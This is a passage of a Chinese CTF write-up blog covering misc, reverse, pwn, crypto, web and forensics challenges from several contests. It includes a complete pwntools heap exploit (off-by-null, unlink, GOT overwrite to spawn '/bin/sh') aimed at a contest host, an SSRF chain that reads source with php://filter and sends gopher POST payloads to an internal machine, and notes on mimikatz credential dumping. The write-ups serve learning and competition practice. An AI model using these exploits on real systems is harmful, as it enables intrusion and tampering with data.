i in range(5):        body.append(body_1[i])        body.append(body_2[i])    body.append(body_1[5])    return [data[i] for i in body]def draw_img(data):    assert len(data) == 29 and len(data[0]) == 29    img = Image.new(&#x27;RGB&#x27;, (31, 31), (255,255,255))    for i, row in enumerate(data):        for j, pixel in enumerate(row):            img.putpixel((j + 1, i + 1), (0,0,0) if pixel == 1 else (255,255,255))    return imgwith tqdm(total=720 * 120) as pbar:    for body_1 in permutations(shuffle_1):        for body_2 in permutations(shuffle_2):            im = draw_img(head + body(body_1, body_2) + tail)            barcodes = pyzbar.decode(im)            pbar.update(1)            if(len(barcodes) == 0):                continue            for barcode in barcodes:                barcodeData = barcode.data.decode(&quot;utf-8&quot;)                print(barcodeData)                plt.imshow(im)                plt.show()



misc3binwalk分理出一个压缩包

还是lsb解密，密码在图片结尾，7his_1s_p4s5w0rd


reversere2通过gdb动态调试获取地图的全貌
0层 0  1  1  1 1  1  1  1 0  0  0  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1
1层 1  1  1  1 1  1  1  1 1  1  0  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1
2层 1  1  1  1 1  1  1  1 1  1  0  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  1  1  1
3层 1  1  1  1 1  1  1  1 1  1  0  0 1  1  1  1 1  1  1  0 1  1  1  1 1  1  1  0 1  1  1  1 1  1  1  0 1  0  1  1 1  1  1  0 1  1  1  1 1  1  1  0 0  0  1  1 1  1  1  1 1  1  1  1
4层 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1
5层 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1
6层 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  0  0  0 1  1  1  1 1  1  1  0
7层 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  0  1  1 1  1  1  1 1  1  1  0
511=64*7+63所以程序要求从第0层的开头走到第7层的结尾
分别通过a-下，b-上，l-左，r-右，u-下一层，d-上一层进行移动

input: arruuuraaaaarrdbbuuuuuaadrrau
flag：flag&#123;6c2a5b75-232d-26ea-c3cc-8f7a924d7357&#125;
pwnpwn2利用创建chunk时的off by null漏洞，通过chunk3设置chunk4的inuse位为0，这样在释放chunk4时就会触发unlink
利用unlink，在chunk_list中写入chunk_list的地址，这样可以达到任意地址读写,需要在合并之前将chunk3的fd-&gt;bk与bk-&gt;fd指向chunk3,chunk3-&gt;fd与chunk3-&gt;bk，就为chunk_list上的地址
然后因为程序中strlen和free都是以chunk为第一个参数，所以可以通过修改got表内free的内容为plt表中的puts，来获取chunk3的fd字段，计算得到libc地址，通过修改got表中的strlen内容为system地址 执行system(&quot;/bin/sh&quot;)
from pwn import *from LibcSearcher import *#context.log_level=&#x27;debug&#x27;def add(ind,size,data):    p.sendlineafter(&#x27;&gt;&#x27;,&#x27;1&#x27;)    p.sendlineafter(&#x27;(0~9):&#x27;,str(ind))    p.sendlineafter(&#x27;(1 ~ 1024):&#x27;,str(size))    p.sendafter(&#x27;Content:&#x27;,data)def show(ind):    p.sendlineafter(&#x27;&gt;&#x27;,&#x27;2&#x27;)    p.sendlineafter(&#x27;(0~9):&#x27;,str(ind))def free(ind):    p.sendlineafter(&#x27;&gt;&#x27;,&#x27;3&#x27;)    p.sendlineafter(&#x27;(0~9):&#x27;,str(ind))def edit(ind,data):    p.sendlineafter(&#x27;&gt;&#x27;,&#x27;4&#x27;)    p.sendlineafter(&#x27;(0~9):&#x27;,str(ind))    p.sendafter(&#x27;Content:&#x27;,data)p=remote(&#x27;101.200.76.17&#x27;,&#x27;24195&#x27;)#p=process(&#x27;./b64heap&#x27;)#gdb.attach(p)e=ELF(&#x27;./b64heap&#x27;,checksec=0)libc=ELF(&#x27;./libc-2.23.so&#x27;,checksec=0)free_got=e.got[&#x27;free&#x27;]strlen_got=e.got[&#x27;strlen&#x27;]puts_plt=e.plt[&#x27;puts&#x27;]chunk_list=0x6020c0heap_list=chunk_listadd(0,0x10,&quot;/bin/sh\x00&quot;)add(1,0x10,&quot; &quot;)add(2,0x10,&quot; &quot;)add(3,0x90,&quot; &quot;)add(4,0xf0,&quot; &quot;)add(5,0x30,&quot; &quot;)add(6,0x30,&#x27;/bin/sh\x00&#x27;)free(3)fd=heap_list+0x8*3-0x18bk=heap_list+0x8*3-0x10add(3,0x98,p64(0)+p64(0x91)+p64(fd)+p64(bk)+b&#x27;a&#x27;*0x70+p64(0x90))free(4)#free(3)edit(3,b&#x27;a&#x27;*8)show(3)edit(3,p64(heap_list+0x8*5))edit(0,p64(heap_list+0x8))edit(3,p64(free_got))edit(5,p8(0x80))edit(0,p64(puts_plt))free(1)d=u64(p.read(6).ljust(8,b&#x27;\x00&#x27;))print(hex(d))malloc_hook=d-0x58-0x10system=malloc_hook-libc.sym[&#x27;__malloc_hook&#x27;]+libc.sym[&#x27;system&#x27;]print(hex(strlen_got))print(hex(system))edit(3,p64(strlen_got))edit(0,p64(system))edit(6,&#x27;cat flag\n&#x27;)p.interactive()


cryptocrypto1只有A，B和空格，明显是摩斯将A替换成-，B替换成.，空格替换/
解密脚本
class morse:    def __init__(self):        self.codedict=&#123;&#x27;.-&#x27;:&quot;a&quot;,                    &#x27;-...&#x27;:&quot;b&quot;,                    &#x27;-.-.&#x27;:&quot;c&quot;,                    &#x27;-..&#x27;:&quot;d&quot;,                    &#x27;.&#x27;:&quot;e&quot;,                    &#x27;..-.&#x27;:&quot;f&quot;,                    &#x27;--.&#x27;:&quot;g&quot;,                    &#x27;....&#x27;:&quot;h&quot;,                    &#x27;..&#x27;:&quot;i&quot;,                    &#x27;.---&#x27;:&quot;j&quot;,                    &#x27;-.-&#x27;:&quot;k&quot;,                    &#x27;.-..&#x27;:&quot;l&quot;,                    &#x27;--&#x27;:&quot;m&quot;,                    &#x27;-.&#x27;:&quot;n&quot;,                    &#x27;---&#x27;:&quot;o&quot;,                    &#x27;.--.&#x27;:&quot;p&quot;,                    &#x27;--.-&#x27;:&quot;q&quot;,                    &#x27;.-.&#x27;:&quot;r&quot;,                    &#x27;...&#x27;:&quot;s&quot;,                    &#x27;-&#x27;:&quot;t&quot;,                    &#x27;..-&#x27;:&quot;u&quot;,                    &#x27;...-&#x27;:&quot;v&quot;,                    &#x27;.--&#x27;:&quot;w&quot;,                    &#x27;-..-&#x27;:&quot;x&quot;,                    &#x27;-.--&#x27;:&quot;y&quot;,                    &#x27;--..&#x27;:&quot;z&quot;,                    &#x27;.----&#x27;:&quot;1&quot;,                    &#x27;..---&#x27;:&quot;2&quot;,                    &#x27;...--&#x27;:&quot;3&quot;,                    &#x27;....-&#x27;:&quot;4&quot;,                    &#x27;.....&#x27;:&quot;5&quot;,                    &#x27;-....&#x27;:&quot;6&quot;,                    &#x27;--...&#x27;:&quot;7&quot;,                    &#x27;---..&#x27;:&quot;8&quot;,                    &#x27;----.&#x27;:&quot;9&quot;,                    &#x27;-----&#x27;:&quot;0&quot;,                    &#x27;..--..&#x27;:&quot;?&quot;,                    &#x27;-..-.&#x27;:&quot;/&quot;,                    &#x27;-.--.&#x27;:&quot;(&quot;,                    &#x27;-.--.-&#x27;:&quot;)&quot;,                    &#x27;-....-&#x27;:&quot;-&quot;,                    &#x27;.-.-.-&#x27;:&quot;.&quot;,                    &#x27;--..--&#x27;:&#x27;,&#x27;,                    &#x27;-.-.-.&#x27;:&#x27;;&#x27;,                    &#x27;.----.&#x27;:&#x27;\&#x27;&#x27;&#125;    def GetPlain(self,text):        textlist=text.split(&#x27;/&#x27;)        detext=&#x27;&#x27;        for i in textlist:            detext+=self.codedict[i]        return detext;    def DeBlast(self,text,detext):        for i in self.codedict.keys():            if text.find(i)==0:                if (len(text)-len(i))==0:                    self.delist.append(detext+self.codedict[i])                    continue                self.DeBlast(text[len(i):],detext+self.codedict[i])    def decode(self,text,seg=&#x27;/&#x27;,point=&#x27;.&#x27;,hor=&#x27;-&#x27;,blast=0,out=1):        &quot;&quot;&quot;            key[0]==&#x27;.&#x27;            key[1]==&#x27;-&#x27;            key[2]==&#x27;/&#x27;        &quot;&quot;&quot;        key=[point,hor,seg]        div=[&#x27;.&#x27;,&#x27;-&#x27;,&#x27;/&#x27;]        if blast==0:            self.detext=self.GetPlain(text)            if out:                print(self.detext)            return self.detext        else:            for i in range(2):                text=text.replace(key[i],div[i])            self.delist=[]            self.DeBlast(text,&#x27;&#x27;)            if out:                for i in self.delist:                        print(i)            return self.delistm=morse()f=open(&#x27;classicCrypto.txt&#x27;)d=f.read().splitlines()e=&#x27;&#x27;for i in d:    e=e+m.decode(i)+&#x27; &#x27;print(e)


在https://quipqiup.com/爆破
cryptography is the practice and study of techniques for secure communication in the presence of adversarial behavior, which is divided into classical cryptography and modern cryptography. the main classical cipher types are transposition ciphers, which rearrange the order of letters in a message. an early substitution cipher was the caesar cipher, in which each letter in the plaintext was replaced by a letter some fixed number of positions further down the alphabet. since the development of rotor cipher machines in world war i and the advent of computers in world war ii, cryptography methods have become increasingly complex and its applications more varied. modern cryptography is heavily based on mathematical theory and computer science practice; cryptographic algorithms are designed around computational hardness assumptions. the growth of cryptographic technology has raised a number of legal issues in the information age. cryptography&#39;s potential for use as a tool for espionage and sedition has led many governments to classify it as a weapon and to limit or even prohibit its use and export. in some jurisdictions where the use of cryptography is legal, laws permit investigators to compel the disclosure of encryption keys for documents relevant to an investigation. cryptography also plays a major role in digital rights management and copyright infringement disputes in regard to digital media.the flag is 1d817f23-4e20-9405-bf6d-e83d055316d6, please add flag string and braces yourself, and all letters are lowercase.
得到flag：1d817f23-4e20-9405-bf6d-e83d055316d6
crypto2将题目给出的字符串进行栅栏后发现与flag形式接近

根据flag的格式发现整个字符串需要异或32，根据题目描述的uuid格式，发现flag中小写的l为-，所以原先小写的字符在异或32的基础上还要减去31
解题脚本
a=&quot;FvLFArGp[ovpxBpsssD]qCElwwoClsoColwpuvlqFv&quot;b=&quot;FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]&quot;e=&#x27;&#x27;for i in b:    if i.islower():        e=e+chr((ord(i)^32)-31)    else:        e=e+chr(ord(i)^32)print(e)


]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2022竞赛</tag>
        <tag>强网杯</tag>
      </tags>
  </entry>
  <entry>
    <title>极客挑战2021-misc-wp</title>
    <url>/posts/5c5d1357/</url>
    <content><![CDATA[前言个人感觉有几题出的不是很合理，但还是有收获的
In the Air
Intro &amp;&amp; Hint: 善于观察藏在身边的 flag， 提示：无线电会在空气中传播

没啥好说的，只有校内能做，WiFI名字就是flag
easysend
Intro &amp;&amp; Hint: (区块链)描述：请发送0.1Rospten测试币到0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470

使用metamask发送0.1测试币复制hash值到题目连接中验证即可拿到flag
这是什么命令
Intro &amp;&amp; Hint: 命令执行的vps ip为 110.42.233.91 执行的命令 cat flag.png | base64 | base64 | tac | nl | sort -k 2 &gt; flag.txt ;rm -f flag.png &amp; nohup php -S 0.0.0.0:2333 &gt;&gt; &#x2F;dev&#x2F;null 2&gt;&amp;1 &amp;

分开来分析第一部分cat flag.png | base64 | base64 | tac | nl | sort -k 2 &gt; flag.txt tac：文件内容倒序输出nl：输出文件内容并加上行号sort -k 2：将内容从a-z排序后输出所以第一条命令的含义就是将flag.png两次base64的值倒序后按A-Z加上行号输出至flag.txt
第二部分rm -f flag.png &amp; nohup php -S 0.0.0.0:2333 &gt;&gt; /dev/null 2&gt;&amp;1 &amp;rm -r：删除文件nohup：不挂断地运行命令php -S：启动内置的web服务器所以第二条命令的含义是删除图片，并在后台不间断的运行web服务器，端口为2333
直接访问http://110.42.233.91:2333/flag.txt，拿到数据直接上脚本
f=open(&#x27;2333.txt&#x27;)d=f.readlines()e=[&#x27;&#x27;]*500import base64for i in d:    ca=i.strip().split()    print(base64.b64decode(ca[1]))    e[int(ca[0])]=base64.b64decode(ca[1])f=open(&#x27;2333.png&#x27;,&#x27;wb&#x27;)f.write(base64.b64decode(&#x27;&#x27;.join(e[::-1])))f.close()print(&#x27;ok&#x27;)
flag在解出来的图片上
官方wp：
curl http://110.42.233.91:2333/flag.txt | sort -n | tac | awk -F &#x27; &#x27; &#x27;&#123;print $2&#125;&#x27; | base64 -d | base64 -d &gt; flag.png ; img2txt flag.png --nocolor --nohtml -- maxLen=30



easycreat
Intro &amp;&amp; Hint: 描述:在Rospten测试链部署一个合约

单独拿出来写了一篇文章提交hash验证即可
今天有被破防吗？
Intro &amp;&amp; Hint: 每个人都有决定自己是谁的权力

三个一组的十六进制值，很容易想到RGB因为一共有1166400行，是1080的平方数，得出原图片高宽为1080脚本还原
from PIL import Imagea=Image.new(&#x27;RGB&#x27;,(1080,1080))f=open(&#x27;ans.txt&#x27;)d=f.readlines()d=[tuple([int(i.strip().split()[0],16),int(i.strip().split()[1],16),int(i.strip().split()[2],16)]) for i in d]a.putdata(d)a.save(&#x27;ans.png&#x27;)
可以使用gaps拼图，先用画图量出小区域的高宽
gaps --image=1.png  --size=40 --save

最后垂直翻转一下图片得到flag
说实话挺好玩的，不是吗？
Intro &amp;&amp; Hint: 你要是觉得好玩，那就玩玩这个

解压后是一个带密码的docx文件压缩包中的提示使用john爆破密码结果是767675，挺坑的，以为是8位数字，爆了两天没出将docx内容复制到txt用十六进制查看，可能是snow加密snow.exe -C ans.txt解密文本
SGA Character
Intro &amp;&amp; Hint: 描述：神秘的语言……仿佛在Minecraft中见过

标准银河字母表
与题目图片一一对应，解出flag
圣嘉然
Intro &amp;&amp; Hint: 描述：嘉然,带我走吧！|hints: 1. http://www.atoolbox.net/Category.php?Id=28

在十六进制下观察文件发现rar头被删了一半，补上52 61 72 21用010打开，发现存在ntfs流隐写导出结果文本有很多emoji表情
我好想做嘉然👪小姐的狗啊。 可是嘉然小姐说她喜欢的是猫🐘，我👰哭了。 我知道既不是狗也不是猫的我为什么要哭的。因为我其实是一只老鼠👣。 我从没奢望嘉然小姐能喜欢自己👴。我明白的，所有人都喜欢理解余裕上手天才打钱的萌萌的狗狗或者猫猫👚，没有人会喜欢阴湿带病的老鼠。 但我还是问了嘉然小姐:“我能不能做你的狗？” 我知道我是注定做不了狗👜的。但如果她喜欢狗，我👲就可以一直在身边看着她了，哪怕她怀里抱着的永远都是狗。 可是她说喜欢的是猫。 她现在还在看着我，还在逗我开心，是因为猫还没有出现，只有我这老鼠每天蹑手蹑脚地从洞👞里爬出来，远远地和她对视。 等她喜欢的猫👛来了的时候，我就该重新滚回我👥的洞了吧。 但我还是好喜欢她👠，她能在我还在她身边的时候多看我几眼吗👘？ 嘉然小姐说接下来的每个圣诞夜都要和大家一起过👘。我不知道大家指哪些人👖。好希望这个集合能够对我做一次胞吞👥。 猫猫👰还在害怕嘉然小姐。 我会去把她爱的猫猫引来的👘。 我👤知道稍有不慎，我就会葬身猫🐘口。 那时候嘉然小姐大概会把我的身体好好地装起来扔到门外👖吧。 那我就成了一包鼠条👰，嘻嘻👜。 我希望她能把我扔得近一点🐧，因为我还是好喜欢她👩。会一直喜欢下去的。 我的灵魂透过窗户向里面看去，挂着的铃铛在轻轻鸣响，嘉然小姐慵懒地靠在沙发上，表演得非常温顺的橘猫坐在她的肩膀👬。壁炉的火光照在她的脸庞，我冻僵的心脏在风里微微发烫👘👖。 —新户眠子
将表情提取出来解密得到s!yl&#125;ce&#123;gdniaa_nyam!_ye0rua_，很明显的w型栅栏
每日一溜
Intro &amp;&amp; Hint: 描述：BV1vK4y1p7F5|hints: 1. https://blog.csdn.net/huanghelouzi/article/details/88628590

数据包分析，使用wireshark发现POST包，传输了一张png图片ctrl+alt+shift+t追踪tcp流转为原始数据后另存为png用binwalk分离出一个文件
FhMrPh94JHqS2jGQGM6QCsaDzI6ZyHqQQB==dnd4cnN0dW9wcTM0NTY3QUJDREVGR0lISnl6MDIxUFFSU1RLTk1MT1phYmNkVVZXWFllZmdoaWprbG1uODkrLw==
将第二个base64解密后得到一个base64表，那么第一个base64就是换表加密后的值脚本如下
import base64import stringstr1 = &quot;FhMrPh94JHqS2jGQGM6QCsaDzI6ZyHqQQB==&quot;string1 = &quot;vwxrstuopq34567ABCDEFGIHJyz021PQRSTKNMLOZabcdUVWXYefghijklmn89+/&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))#str1是要解密的代码#string1是改过之后的base64表


PANDORA PARADOXXX
Intro &amp;&amp; Hint: 描述：为了防止它毁灭世界，我上了层层枷锁……

下载得到一张图片，发现文件中藏了压缩包，binwalk分离第二层：标准伪加密，09改成00第三层：纯数字爆破，得到解压密码513692第四层：发现压缩后hint.txt的crc值与2.zip内hint.txt的crc值一样,可以得出是明文攻击解得口令为Maimai第五层：这一个密码属实是没想到，密码为hint中的单词challenge第六层：解压后就是flag
easyfound
Intro &amp;&amp; Hint: 描述：flag在哪里 0xf8e8f25359bbbdea2187c34a8614dbedec083dbb@rospten

给了合约源码
contract syc&#123;    address owner=0x0b896c359adf4bb1c19c7dfd41dc35dc9216e470;    bool a=true;    bool b=false;    uint[] tuple=[0x77,0x88,0x99];    strings[] flag=[flag1,flag2];&#125;
这题涉及到区块链的变量存储机制，推荐一篇文章
代码中一共存储了8个变量，分别是owner,a,b,0x77,0x88,0x99,flag1,flag2在区块链浏览器中查看插槽
https://ropsten.etherscan.io/tx/0xcf7759b8d59b9c462c5c8a69a30e9b862bee3cbac995d896d58ba8ef592bdafe#statechange
第一个插槽存储的是地址owner第二和第三个插槽存储的是bool变量a和b第四和第五个插槽存储的是strings类型的变量flag1和flag2,将两个变量连接到一起就是flag了，注意$符号是连接符第六七八存的是tuple数组
三叶草聚会
Intro &amp;&amp; Hint: 描述: 嘿，我们去聚会吧!拿着你的入门券! | hints: 1.注意题目名称

解压后得到一个key和hint.txt从hint.txt中可以知道与git有关，既然知道了密钥，那么就用ssh连接先创建一个.ssh文件夹，放入key，创建一个config文件config文件内容如下
Host syc        HostName github.com        User git        Port 22        IdentityFile ~/.ssh/key

使用ssh -T syc连接，获取到用户名为SycloverParty
在github上搜索该用户名，得知有一个私有的仓库cake
git clone syc:SycloverParty/cake.git下载下来
有一个假的flag，使用git log --pretty=oneline flag查看文件修改历史
git show 7226aee143cc7cd4095337fca6f994848bd9783a查看历史记录
EzForensics
Intro &amp;&amp; Hint: 简单取证，关键信息在压缩包里,一层一层找出来吧

简单取证题先获取镜像信息

一： 查看默认浏览器访问过的一个 top后缀的域名 例如xxxxxx.top

先用了iehistory命令查看无果那么查文件找到一个chrome的记录
下载下来搜索得到域名为3v1l.rigelx.top

二： 另一个浏览器被用来下载了一个文件 找到这个奇怪的文件名 （很怪

查看下载文件夹得到可疑文件L0v3r.f

三： 本机的hostname，（计算机名和hostname一般是相同的，但大小写不一样

先hivelist看注册表信息地址
查看system
查看CurrentControlSet的value
查看ControlSet001的value
继续看ControlSet001下的\services\tcpip\Parameters
得到主机名P0tt3r

四： 登录1里的站点，尝试从镜像中找到用户名和密码（与windows的一致）看看有什么秘密

最后使用mimikatz拿到账户和密码
登录站点后自动下载得到一个secretword.wav文件大概听了一下，是拨号音，在线解密得到10111011100000
转成摩斯，解密得到yyds

五：拼接后md5

SYC&#123;md5(3v1l.rigelx.topL0v3r.fP0tt3ryyds)&#125;将上述字段拼接在一起后md5加密一下
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>极客挑战</tag>
      </tags>
  </entry>
  <entry>
    <title>极客挑战2021-期末不挂科就算成功-wp</title>
    <url>/posts/993a04bf/</url>
    <content><![CDATA[题目描述
你挂科咯 试试打入学校内网来修改成绩吧(我命由我不由天系列)

可以知道本题需要使用ssrf
伪协议在源代码中发现debug.php
在debug.php中发现可以使用伪协议
传入?file=php://filter/convert.base64-encode/resource=debug.php查看debug.php的源码
//debug.php关键源码&lt;?php    echo &quot;&lt;h1&gt;快去学习PHP伪协议&lt;/h1&gt;&quot;;	error_reporting(0);	$file=$_GET[&#x27;file&#x27;];	if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;		echo &quot;NO！！！&quot;;		exit();	&#125;	include($file);?&gt;

传入?file=php://filter/convert.base64-encode/resource=index.php查看index.php的源码
//index.php关键代码&lt;?php$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $_GET[&#x27;url&#x27;]);#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);curl_setopt($ch, CURLOPT_HEADER, 0);#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);curl_exec($ch);curl_close($ch);//你当前位于学校172.17.0.0/24网段下 其实还有台机子里面可以修改成绩 我偷偷告诉你password是123456,name是admin,//result必须要改成60 不然学校会查的！！！?&gt;

从index.php中可以得出几个结论：1：name为admin，password为123456，result为602：网段是172.17.0.0.&#x2F;24
再用伪协议查看当前主机的敏感文件/etc/hosts和/proc/net/arp,得到很多内网ip，fuzz一下，得到最终需要的一个内网ip172.17.0.7
ssrf既然知道了主机等信息，那么就可以开始构造ssrf了，使用gopher协议打构造post包
http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST /index.php HTTP/1.1Host: 172.17.0.7:80Content-Type: application/x-www-form-urlencodedContent-Length: 36name=admin&amp;password=123456&amp;result=60
将空格，冒号，等于用url编码，结尾换行用%0d%0a替换
http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_POST%20/index.php%20HTTP/1.1%0D%0AHost%3A%20172.17.0.7%3A80%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2036%0D%0A%0D%0Aname%3Dadmin%26password%3D123456%26result%3D60%0D%0A
二次url编码：将_后的所有字符进行url编码
http://106.55.154.252:8010/?url=gopher://172.17.0.7:80/_%50%4f%53%54%25%32%30%2f%69%6e%64%65%78%2e%70%68%70%25%32%30%48%54%54%50%2f%31%2e%31%25%30%44%25%30%41%48%6f%73%74%25%33%41%25%32%30%31%37%32%2e%31%37%2e%30%2e%37%25%33%41%38%30%25%30%44%25%30%41%43%6f%6e%74%65%6e%74%2d%54%79%70%65%25%33%41%25%32%30%61%70%70%6c%69%63%61%74%69%6f%6e%2f%78%2d%77%77%77%2d%66%6f%72%6d%2d%75%72%6c%65%6e%63%6f%64%65%64%25%30%44%25%30%41%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%25%33%41%25%32%30%33%36%25%30%44%25%30%41%25%30%44%25%30%41%6e%61%6d%65%25%33%44%61%64%6d%69%6e%25%32%36%70%61%73%73%77%6f%72%64%25%33%44%31%32%33%34%35%36%25%32%36%72%65%73%75%6c%74%25%33%44%36%30%25%30%44%25%30%41

总结1:换行需要使用%0d%0a替换2:/etc/hosts和/proc/net/arp是查看网络信息的敏感文件
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>2021竞赛</tag>
        <tag>极客挑战</tag>
        <tag>ssrf</tag>
      </tags>
  </entry>
  <entry>
    <title>第一届长城杯信息安全铁人三项赛决赛 取证溯源 wp</title>
    <url>/posts/8ba5208d/</url>
    <content><![CDATA[取证溯源
1、您的同事李白在运维一台部署了移动应用服务端的linux服务器时发现了异常，好像被黑客攻击了。小李通过简单分析，发现可能是由于公司的移动应用和其服务端程序都存在安全问题导致的。小李将当天可能与攻击相关的流量导出，并与移动应用一起打包压缩，你可以下载分析，也可以登录此服务器进行攻击溯源、排查等，提供了SSH和VNC访问的方式供您和您的团队进行分析取证。

关卡01： 100 分
关卡描述：黑客攻击此服务器所使用的2个IP分别是什么（ascii码从小到大排列，空格分隔）

流量包得到第一个攻击ip

在定时反弹的邮件中得到另一个ip

202.1.1.1 202.1.1.129
关卡02： 50 分
关卡描述：存在安全问题的apk中使用的登录密码是什么?

jadx打开搜索password

password663399
关卡03： 50 分
关卡描述：黑客尝试上传一个文件但显示无上传权限的文件名是什么？

在流量包中搜索

pic.jpg
关卡04： 150 分
关卡描述：黑客利用的漏洞接口的api地址是什么?（http://xxxx/xx)

找到上传成功的那个包即可

http://202.1.1.66:8080/api/upload
关卡05： 150 分
关卡描述：黑客上传的webshell绝对路径是什么？

连上靶机，找到tomcat根目录，然后根据上一题的访问路径找到shell

/usr/local/tomcat/webapps/ROOT/static/s74e7vwmzs21d5x6.jsp
关卡06： 150 分
关卡描述：黑客上传的webshell的密码是什么？

分析上上题的代码

bing_pass
关卡07： 200 分
关卡描述：黑客通过webshell执行的第一条命令是什么？

筛选访问/static/s74e7vwmzs21d5x6.jsp的流量
第一个包是冰蝎的状态检测，所以应该看第二个包
密钥是b99f657b04941030

解aes后反编译

pwd
关卡08： 150 分
关卡描述：黑客获取webshell时查询当前shell的权限是什么？

继续跟/static/s74e7vwmzs21d5x6.jsp的流量
找到执行whoami的

拿返回值解密aes，再解base64

tomcat
关卡09： 150 分
关卡描述：利用webshell查询服务器Linux系统发行版本是什么？

步骤和上一题一样
有一个包执行了cat /etc/redhat-release，找返回值解密即可

CentOS Linux release 7.4.1708 (Core)
关卡10： 50 分
关卡描述：黑客从服务器上下载的秘密文件的绝对路径是什么？

shell同目录下可以看到secert.file

/usr/local/tomcat/webapps/ROOT/static/secert.file
关卡11： 50 分
关卡描述：黑客通过反连执行的第一条命令是什么？

找到反弹shell的地址202.1.1.129:4444

在流量包中筛选4444端口，然后追踪流

cat /etc/passwd
关卡12： 50 分
关卡描述：黑客通过什么文件修改的root密码（绝对路径）

图片同上
/etc/passwd
关卡13： 250 分
关卡描述：黑客设置的root密码是多少？

爆破上上图中的hash

123456
关卡14： 50 分
关卡描述：黑客留下后门的反连的ip和port是什么？（ip:port)

查看定时任务

202.1.1.129:9999
关卡15： 150 分
关卡描述：黑客通过后门反连执行的第一条命令是什么？

流量过滤9999单端口

rpm -qa | grep pam
关卡16： 200 分
关卡描述：黑客通过什么文件留下了后门？

根据上一题的命令去搜索pam相关文件
找到/usr/lib/security/pam_unix.so和/usr/lib64/security/pam_unix.so
存在后门

pam_unix.so
关卡17： 300 分
关卡描述：黑客设置的后门密码是什么？

继续往下走，直接看到密码

ssh_back_pwd
关卡18： 250 分
关卡描述：黑客的后门将root密码记录在哪个文件中？（绝对路径）

继续向下

/tmp/.sshlog
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>长城杯</tag>
        <tag>2024竞赛</tag>
      </tags>
  </entry>
  <entry>
    <title>第三届&quot;红明谷&quot;杯网络安全大赛wp</title>
    <url>/posts/86dd8190/</url>
    <content><![CDATA[misc阿尼亚文件尾有一串字符串6333383363333963633338326333616263333865633261616332613363326261633262636333623263326235633261356332623563333834633262316333613063333832633361623061，十六进制转字符串得到c383c39cc382c3abc38ec2aac2a3c2bac2bcc3b2c2b5c2a5c2b5c384c2b1c3a0c382c3ab0a
C383明显是中文编码，转十六进制后爆破得到密码简单的编码

根据图片名字netpixeljihad，使用PixelJihad解密，密码是简单的编码

得到压缩包的密码P@Ss_W0RD:)
解压得到+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-
在线解密一把梭

hacker流量分析，发现有个shell.php上传了一个xxx1.php，然后执行了ls和cat secret.txt
格式化后如下
